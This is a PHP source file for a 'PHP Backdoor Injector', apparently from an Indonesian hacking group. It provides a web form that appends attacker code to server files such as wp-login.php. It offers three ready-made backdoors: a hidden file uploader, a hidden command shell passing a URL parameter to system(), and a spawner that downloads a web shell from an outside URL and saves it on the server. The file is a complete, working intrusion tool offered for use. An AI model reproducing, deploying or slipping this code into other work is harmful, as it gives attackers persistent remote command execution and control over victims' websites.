<?php
/*
        PHP Backdoor Injector v.1.0
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($file,$code){
$fh=fopen($file,a);
if(fwrite($fh,"$code")){
echo "<script>alert('Success Injected!');</script>";
fclose($fh);
}else{echo "<script>alert('Forbidden!');</script>";}
}
if(isset($_POST['inject'])){
$filename=$_POST['filename'];$code=$_POST['74nc0x'];
inject($filename,$code);
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "74nc0x@soracyberteam:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell Mu Cok!
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector</title>
<center><body bgcolor='black'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

File Name : <input type='text' name='filename' placeholder='wp-login.php'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team
